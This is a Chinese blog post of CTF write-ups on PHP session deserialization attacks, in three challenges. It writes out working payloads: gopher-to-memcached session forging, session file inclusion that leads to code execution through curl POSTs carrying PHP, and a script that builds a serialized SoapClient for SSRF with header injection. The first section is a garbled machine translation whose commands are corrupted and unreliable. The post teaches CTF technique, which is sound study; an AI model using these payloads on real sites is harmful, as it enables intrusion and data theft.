---
layout: post
title:  PHP Session 反序列化漏洞与利用
noToc: true
date:   2018-11-19 23:30:00 +0800
tags: WEB安全
cover: '../assets/test5.png'
---

# PHP Session 反序列化漏洞与利用

## 1.安恒429|web 3 session反序列化-Alictf web 400 Recruitment

上传模块可以从外部URL获取内容这样它可以使用curl或file_get_contents函数，如果没有检查URL，那么它会变成SSRF vuln

对于URL，它只能以.jpg结尾

但我们可以使用302重定向

的NodeJS

```
response.writeHead（302，{
  '位置'：'gopher：//127.0.0.1:80 /'
}）;
```

fisrt我试过file：// php：// scheme但是失败了

这样可以使用卷曲

然后我使用gopher方案来检测哪个端口是打开的

正如我猜测的那样，端口11211是开放的，并且memcached服务器可以被本地用户利用

现在我们可以尝试构建一个攻击链

```
鼠：//127.0.0.1：11211 / _stats％20items％0D 0A％
统计项目xxx
stats cachedump 5 100
```

它显示了session的值，我们知道php使用memcached来保存会话

![PIC1](https://miao.su/images/2018/04/12/x074caf.jpg)

使用

```
设置键标志exptime bytes
```

然后我们进入管理员帐户

![PIC2](https://miao.su/images/2018/04/12/x1a83a8.png)

但由于它显示了通知，我们无法获得该标志

![PIC3](https://miao.su/images/2018/04/12/x2c1e20.png)

看到html源代码并找到备份代码

![PIC4](https://miao.su/images/2018/04/12/x3b382b.jpg)

绝对有一个SQL注入漏洞

![图像pic5](https://miao.su/images/2018/04/12/x451c3a.png)

并最终夺取国旗

 

之所以单独的把他拿出来呢,是因为之前接触到的反序列化的洞和题目已经挺多了的,包括p总出的三个白帽啊,某ctf的一些题目都涉及到这个方面的东西。

但是呢,在这道题目里找到了一些新的东西,值得自己思考一下

参考了资料 http://drops.wooyun.org/tips/3909

和p总的提示:

session的序列化是指,存储到session文件中的是经过序列化的字符串,而我们能访问到的$_SESSION是已经被解析的变量

首先我们要了解,php在session存储和读取数据时,都会有一个序列化和反序列化的过程。

而反序列化中会调用对象的magic方法,比如__destruct(),__wakeup()等,都是很常见的东西,不予赘述了。

那么这里有一个配置选项 session.serialize_handler

可以用ini_set或者在php.ini中加以设置

有下面几种用于处理序列化的处理器类型

处理器 对应的存储格式

php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值

php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值

php_serialize

(php>=5.5.4) 经过 serialize() 函数反序列处理的数组

对于php处理器,如果我们先用php_serialize加以序列化,那么对于这样的一个字符串

```
a:1:{s:4:"test";s:20:"|O:8:"stdClass":0:{}";}
```

最后会被解释为:键名为 `a:1:{s:4:"test";s:20:"` 的一个对象

而php处理器序列化,则是把$_SESSION的每个键值都 **单独** 拿出来,比如$_SESSION['test']

就是test|序列化的值

而php_serialize则会直接将整个session数组序列化。最后存储的是一整个数组的序列化数值

那么这样就好理解了,如果在处理器session.serialize_handler=php_serialize的情况下

我们构造带有竖线的字符串,在其他处理器为php的地方,就可以反序列化出伪造的对象。

而我们这里明显是需要去操作session的,文章中为了测试使用的是

```
$_SESSION['ryat'] = $_GET['ryat'];
```

然而很多时候没有这个条件的,怎么办呢

http://php.net/manual/zh/session.upload-progress.php

php为了提供一个上传进度的数据

$n=ini_get("session.upload_progress.name");

会把它存储在$_SESSION["$n"] 当中。

这样我们构造一个文件上传页,就可以成功写入session了

## 2.XCTF-bestphp1

### 文件包含

拿到题目后发现

[![img](https://p0.ssl.qhimg.com/t01f4635c2ec475fad7.png)](https://p0.ssl.qhimg.com/t01f4635c2ec475fad7.png)

代码非常简短，但是问题很明确，我们看到了函数

```
call_user_func($func,$_GET);
```

这里想到的第一反应是利用extract进行变量覆盖，从而达到任意文件包含

例如：

```
?function=extract&file=php://filter/read=convert.base64-encode/resource=index.php
```

[![img](https://p3.ssl.qhimg.com/t0152286903eb4027ac.png)](https://p3.ssl.qhimg.com/t0152286903eb4027ac.png)

发现可以成功读取，尝试读function.php

```
<?php
function filters($data){
    foreach($data as $key=>$value){
        if(preg_match('/eval|assert|exec|passthru|glob|system|popen/i',$value)){
            die('Do not hack me!');
        }
    }
}
?>
```

尝试读admin.php

```
hello admin
<?php
if(empty($_SESSION['name'])){
    session_start();
    #echo 'hello ' + $_SESSION['name'];
}else{
    die('you must login with admin');
}

?>
```

发现都不行，最后落点还得是在getshell，那么思考一下攻击方式，很容易就想到了最近热门的session+lfi的攻击方式

但是这里有一个问题：

```
ini_set('open_basedir', '/var/www/html:/tmp');
```

我们无法直接去包含默认路径

```
/var/lib/php/sessions/sess_phpsessid
```

[![img](https://p4.ssl.qhimg.com/t010925aa11f1d36006.png)](https://p4.ssl.qhimg.com/t010925aa11f1d36006.png)

那么怎么办？

**session_start**

在走投无路的时候选择查看php手册

发现session_start()中有这样一段

[![img](https://p4.ssl.qhimg.com/t012c701b735e743848.png)](https://p4.ssl.qhimg.com/t012c701b735e743848.png)

那我们跟进会话配置指示

[![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018272eecdfb7cb2d7.png)

发现了save_path,跟进

[![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010d1ec80e07fe732c.png)

发现该方式可以更改session存储路径，那我们尝试一下

```
?function=session_start&save_path=/tmp
```

然后去包含

```
?function=extract&file=/tmp/sess_kpk22r3qq2v69d2uj1iigcp5c2?func
```

[![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e0532ccb6b2faf63.png)

发现路径更改成功，包含了session

**RCE**

那么现在唯一的问题就是如何控制session的内容了，这里我有想到最近很流行的session.upload_progress，但是这样太麻烦了。

我们不难发现这里有一个$_SESSION[‘name’]，并且其可以被我们post的name复制，那这就可以达到控制session内容的目的。

我们尝试

```
curl -v -X POST -d "name=<?=phpinfo();?>" http://vps_ip:port/?function=session_start&save_path=/tmp
```

再去包含对应的session

```
?function=extract&file=/tmp/sess_jisv70lep6v1nfokagdll4scs7
```

得到

[![img](https://p3.ssl.qhimg.com/t0163dfa112b4a2322f.png)](https://p3.ssl.qhimg.com/t0163dfa112b4a2322f.png)

尝试读取目录

```
curl -v -X POST -d "name=<?=var_dump(scandir('./'));?>" http://vps_ip:port/?function=session_start&save_path=/tmp
```

包含文件

```
?function=extract&file=/tmp/sess_3b624no3ucdj27un5idq57jta0
```

可以成功列目录

[![img](https://p3.ssl.qhimg.com/t018eb738f6f6676f81.png)](https://p3.ssl.qhimg.com/t018eb738f6f6676f81.png)

由于是本地环境，没有存放flag，所以到此一步，题目就完结了。后面找到flag直接cat即可

## 3.2018-LCTF-bestphp’s revenge

拿到题目

index.php

```
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET[f],$_POST);
session_start();
if(isset($_GET[name])){
    $_SESSION[name] = $_GET[name];
}
var_dump($_SESSION);
$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
call_user_func($b,$a);
?>
```

flag.php

[![img](https://p0.ssl.qhimg.com/t0105f01419067557d8.png)](https://p0.ssl.qhimg.com/t0105f01419067557d8.png)

代码非常简短，也很有意思，但是思路肯定很明确：SSRF

既然是SSRF，那么该如何满足以下条件呢？

- 访问127.0.0.1/flag.php
- cookie可控，改成我们的php_session_id

那么势必得到一个php内置类，同时其具备SSRF的能力

### SoapClient

这里不难想到之前N1CTF出过的hard_php一题，里面就使用了php内置类SoapClient进行SSRF

[![img](https://p2.ssl.qhimg.com/t01ffe012e6d62011de.png)](https://p2.ssl.qhimg.com/t01ffe012e6d62011de.png)

但是问题来了，我怎么触发反序列化？

看到

```
if(isset($_GET[name])){
  $_SESSION[name] = $_GET[name];
}
```

我们不难想到，可以将序列化内容通过$_GET[name]传入session，但是我们本地测试：

[![img](https://p4.ssl.qhimg.com/t012f91dfaf623fc69d.jpg)](https://p4.ssl.qhimg.com/t012f91dfaf623fc69d.jpg)

发现session里的内容是会被进行一次序列化写入的，并且还有

```
name |
```

这样的东西存在。别说触发反序列化了，我们连基本的语句都构造不出来。

后来搜到这样一篇文章

```
https://blog.spoock.com/2016/10/16/php-serialize-problem/
```

首先我们可以控制session.serialize_handler,通过

```
/?f=session_start

serialize_handler=php
```

这样的方式，可以指定php序列化引擎,而不同引擎存储的方式也不同

-  php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
-  php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
-  php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值

同时根据文章内的内容，当session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞

假如我们使用`php_serialize`引擎时进行数据存储时的序列化，可以得到内容

```
$_SESSION[‘name’] = ‘sky’;
a:1:{s:4:”name”;s:3:”sky”;}
```

而在php引擎时进行数据存储时的序列化，可以得到另一个内容

```
$_SESSION[‘name’] = ‘sky’;
name|s:3:”sky”
```

那么如果我们用php引擎去解php_serialize得到的序列化，是不是就会有问题了呢？

答案是肯定的，该文章中也介绍的很清楚

php引擎会以|作为作为key和value的分隔符，我们再传入内容的时候，比如传入

```
$_SESSION[‘name’] = ‘|sky‘
```

那么使用php_serialize引擎时可以得到序列化内容

```
a:1:{s:4:”name”;s:4:”|sky”;}
```

然后用php引擎反序列化时，|被当做分隔符，于是

```
a:1:{s:4:”name”;s:4:”
```

被当作key

```
sky
```

被当做vaule进行反序列化

于是，我们只要传入

```
$_SESSION[‘name’] = |序列化内容
```

即可 对了，如果你要问，为什么能反序列化？

因为如下图

[![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f1c17eaf55f62f7b.png)

### 如何触发__call

光进行反序列化肯定是不够的

[![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011a26bc56975fd806.png)

我们看到soapclient想要触发__call()必须要调用不可访问的方法，那我们如何在题目有限的代码里调用不可访问方法呢？

看到这段代码

```
php $a = array(reset($_SESSION),'welcome_to_the_lctf2018'); call_user_func($b,$a);
```

这里想到如下操作

[![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0137d5ebab7ecc84ef.png)

我们只要覆盖$b为call_user_func即可成功触发不可访问方法

### payload

那么完成payload即可

soap构造脚本

```
<?php
$target='http://127.0.0.1/flag.php';
$b = new SoapClient(null,array('location' => $target,
                               'user_agent' => "AAA:BBBrn" .
                                             "Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912",
                               'uri' => "http://127.0.0.1/"));

$se = serialize($b); 
echo urlencode($se);
```

先发送第一段payload

[![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ca2d21f6702a6fa4.png)

在发送第二段payload

[![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01aa4e8c03a2f8e3b2.png)

flag手到擒来！